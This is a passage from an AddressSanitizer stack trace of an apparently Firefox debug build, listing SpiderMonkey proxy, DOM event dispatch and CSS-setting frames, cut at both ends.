const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #8 0x7f934fdf729c in js::InvokeGetterOrSetter(JSContext*, JSObject*, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:505:0 #9 0x7f93500fd3aa in js::CallSetter(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, int (*)(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, int, JS::MutableHandle<JS::Value>), unsigned int, unsigned int, int, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:452:0 #10 0x7f93501409f6 in js::BaseProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:240:0 #11 0x7f935015b600 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2544:0 #12 0x7f935015f29e in proxy_SetGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2856:0 #13 0x7f93500e8a68 in JSObject::nonNativeSetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsobj.cpp:1657:0 #14 0x7f934fdae1b1 in JSObject::setGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsobjinlines.h:83:0 #15 0x7f9350145a72 in js::DirectProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:611:0 #16 0x7f9350282514 in js::CrossCompartmentWrapper::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jswrapper.cpp:323:0 #17 0x7f935015b600 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2544:0 #18 0x7f935015f29e in proxy_SetGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2856:0 #19 0x7f93500e8a68 in JSObject::nonNativeSetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsobj.cpp:1657:0 #20 0x7f934fdae1b1 in JSObject::setGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsobjinlines.h:83:0 #21 0x7f934fe026e5 in js::SetPropertyOperation(JSContext*, unsigned char*, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter-inl.h:365:0 #22 0x7f934fdead7a in #23 0x7f934fde3adc in js::RunScript(JSContext*, js::StackFrame*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:345:0 #24 0x7f934fdf5423 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:401:0 #25 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #26 0x7f93501436f1 in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:479:0 #27 0x7f93502836bb in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jswrapper.cpp:447:0 #28 0x7f935015c1de in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2616:0 #29 0x7f9350160d00 in proxy_Call(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:3180:0 #30 0x7f934fdf5c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #31 0x7f934fdf5395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #32 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #33 0x7f934ff79461 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:5885:0 #34 0x7f934d7b730c in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedJSClass.cpp:1437:0 #35 0x7f934d7aa1b8 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedJS.cpp:589:0 #36 0x7f934eb723e9 in PrepareAndDispatch /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:122:0 #37 0x7f934eb71276 in #38 0x7f934c9a204c in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener> const&, nsIDOMEvent*, mozilla::dom::EventTarget*, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventListenerManager.cpp:937:0 #39 0x7f934c9a27b1 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventListenerManager.cpp:1008:0 #40 0x7f934c999e2b in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, bool, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:201:0 #41 0x7f934c999795 in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, nsDispatchingCallback*, bool, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:350:0 #42 0x7f934c99b212 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:632:0 #43 0x7f934c99ba6b in nsEventDispatcher::DispatchDOMEvent(nsISupports*, nsEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:695:0 #44 0x7f934c80143e in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsINode.cpp:1148:0 #45 0x7f934c94e1a0 in nsAsyncDOMEvent::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsAsyncDOMEvent.cpp:48:0 #46 0x7f934c708c3b in nsContentUtils::RemoveScriptBlocker() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsContentUtils.cpp:4803:0 #47 0x7f934c77480b in nsDocument::EndUpdate(unsigned int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:4392:0 #48 0x7f934cbd9bff in nsHTMLDocument::EndUpdate(unsigned int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/html/document/src/nsHTMLDocument.cpp:2545:0 #49 0x7f934c47d1c1 in mozAutoDocConditionalContentUpdateBatch::~mozAutoDocConditionalContentUpdateBatch() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/style/../../content/base/src/mozAutoDocUpdate.h:81:0 #50 0x7f934c47c8d0 in nsDOMCSSDeclaration::SetCssText(nsAString_internal const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/style/nsDOMCSSDeclaration.cpp:108:0 #51 0x7f934e3d3029 in nsICSSDeclaration::SetCssText(nsAString_internal const&, mozilla::ErrorResult&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/style/nsICSSDeclaration.h:105:0 #52 0x7f934e3d2d4b in mozilla::dom::CSSStyleDeclarationBinding::set_cssText(JSContext*, JS::Handle<JSObject*>, nsICSSDeclaration*, JSJitSetterCallArgs) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/CSSStyleDeclarationBinding.cpp:43:0 #53 0x7f934e3d1d75 in mozilla::dom::CSSStyleDeclarationBinding::genericSetter(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/CSSStyleDeclarationBinding.cpp:424:0 #54 0x7f934fdf5c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #55 0x7f934fdf5395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #56 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #57 0x7f934fdf729c in js::InvokeGetterOrSetter(JSContext*, JSObject*, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:505:0 #58 0x7f93500fd3aa in js::CallSetter(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, int (*)(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, int, JS::MutableHandle<JS::Value>), unsigned int, unsigned int, int, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:452:0 #59 0x7f93501409f6 in js::BaseProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:240:0 #60 0x7f935015b600 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2544:0 #61 0x7f935015f29e in proxy_SetGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2856:0 #62 0x7f93500e8a68 in JSObject::nonNativeSetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsobj.cpp:1657:0 #63 0x7f934fdae1b1 in JSObject::setGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsobjinlines.h:83:0 #64 0x7f9350145a72 in js::DirectProxyHandler::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:611:0 #65 0x7f9350282514 in js::CrossCompartmentWrapper::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jswrapper.cpp:323:0 #66 0x7f935015b600 in js::Proxy::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, bool, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2544:0 #67 0x7f935015f29e in proxy_SetGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2856:0 #68 0x7f93500e8a68 in JSObject::nonNativeSetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsobj.cpp:1657:0 #69 0x7f934fdae1b1 in JSObject::setGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsobjinlines.h:83:0 #70 0x7f934fe026e5 in js::SetPropertyOperation(JSContext*, unsigned char*, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter-inl.h:365:0 #71 0x7f934fdead7a in #72 0x7f934fde3adc in js::RunScript(JSContext*, js::StackFrame*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:345:0 #73 0x7f934fdf5423 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:401:0 #74 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #75 0x7f93501436f1 in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:479:0 #76 0x7f93502836bb in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jswrapper.cpp:447:0 #77 0x7f935015c1de in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2616:0 #78 0x7f9350160d00 in proxy_Call(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:3180:0 #79 0x7f934fdf5c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #80 0x7f934fdf5395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #81 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #82 0x7f934ff79461 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:5885:0 #83 0x7f934d7b730c in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedJSClass.cpp:1437:0 #84 0x7f934d7aa1b8 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedJS.cpp:589:0 #85 0x7f934eb723e9 in PrepareAndDispatch /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:122:0 #86 0x7f934eb71276 in #87 0x7f934c9a204c in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener> const&, nsIDOMEvent*, mozilla::dom::EventTarget*, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventListenerManager.cpp:937:0 #88 0x7f934c9a27b1 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventListenerManager.cpp:1008:0 #89 0x7f934c999e2b in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, bool, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:201:0 #90 0x7f934c999795 in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, nsDispatchingCallback*, bool, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:350:0 #91 0x7f934c99b212 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:632:0 #92 0x7f934c99ba6b in nsEventDispatcher::DispatchDOMEvent(nsISupports*, nsEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:695:0 #93 0x7f934c80143e in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsINode.cpp:1148:0 #94 0x7f934c94e1a0 in nsAsyncDOMEvent::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsAsyncDOMEvent.cpp:48:0 #95 0x7f934c708c3b in nsContentUtils::RemoveScriptBlocker() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsContentUtils.cpp:4803:0 #96 0x7f934c77480b in nsDocument::EndUpdate(unsigned int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:4392:0 #97 0x7f934cbd9bff in nsHTMLDocument::EndUpdate(unsigned int) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/html/document/src/nsHTMLDocument.cpp:2545:0 #98 0x7f934c2dbb6f in mozAutoDocUpdate::~mozAutoDocUpdate() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/xul/templates/src/../../../base/src/mozAutoDocUpdate.h:38:0 #99 0x7f934c803f35 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsINode.cpp:2000:0 #100 0x7f934e68e486 in mozilla::dom::NodeBinding::appendChild(JSContext*, JS::Handle<JSObject*>, nsINode*, JSJitMethodCallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/NodeBinding.cpp:579:0 #101 0x7f934e68a07d in mozilla::dom::NodeBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/NodeBinding.cpp:1333:0 #102 0x7f934fdf5c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #103 0x7f934fdf5395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #104 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #105 0x7f93501436f1 in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:479:0 #106 0x7f93502836bb in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jswrapper.cpp:447:0 #107 0x7f935015c1de in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:2616:0 #108 0x7f9350160d00 in proxy_Call(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsproxy.cpp:3180:0 #109 0x7f934fdf5c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #110 0x7f934fdf5395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #111 0x7f934fdef7fa in #112 0x7f934fde3adc in js::RunScript(JSContext*, js::StackFrame*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:345:0 #113 0x7f934fdf5423 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:401:0 #114 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #115 0x7f934ff79461 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:5885:0 #116 0x7f934e474b67 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JSObject*>, nsDOMEvent&, mozilla::ErrorResult&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/EventHandlerBinding.cpp:41:0 #117 0x7f934d037253 in JS::Value mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, nsDOMEvent&, mozilla::ErrorResult&, mozilla::dom::CallbackObject::ExceptionHandling) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/../../../dist/include/mozilla/dom/EventHandlerBinding.h:58:0 #118 0x7f934d035f2e in nsJSEventListener::HandleEvent(nsIDOMEvent*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/src/events/nsJSEventListener.cpp:247:0 #119 0x7f934c9a204c in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener> const&, nsIDOMEvent*, mozilla::dom::EventTarget*, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventListenerManager.cpp:937:0 #120 0x7f934c9a27b1 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventListenerManager.cpp:1008:0 #121 0x7f934c999e2b in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, bool, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:201:0 #122 0x7f934c9995bb in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, nsDispatchingCallback*, bool, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:326:0 #123 0x7f934c99b212 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:632:0 #124 0x7f934c99ba6b in nsEventDispatcher::DispatchDOMEvent(nsISupports*, nsEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:695:0 #125 0x7f934c80143e in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsINode.cpp:1148:0 #126 0x7f934c814aac in mozilla::dom::EventTarget::DispatchEvent(nsDOMEvent&, mozilla::ErrorResult&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsINode.cpp:2456:0 #127 0x7f934e480fce in mozilla::dom::EventTargetBinding::dispatchEvent(JSContext*, JS::Handle<JSObject*>, mozilla::dom::EventTarget*, JSJitMethodCallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/EventTargetBinding.cpp:242:0 #128 0x7f934e480a5d in mozilla::dom::EventTargetBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/EventTargetBinding.cpp:408:0 #129 0x7f934fdf5c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #130 0x7f934fdf5395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #131 0x7f934fdef7fa in #132 0x7f934fde3adc in js::RunScript(JSContext*, js::StackFrame*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:345:0 #133 0x7f934fdf5423 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:401:0 #134 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #135 0x7f934ff79461 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:5885:0 #136 0x7f934e474b67 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JSObject*>, nsDOMEvent&, 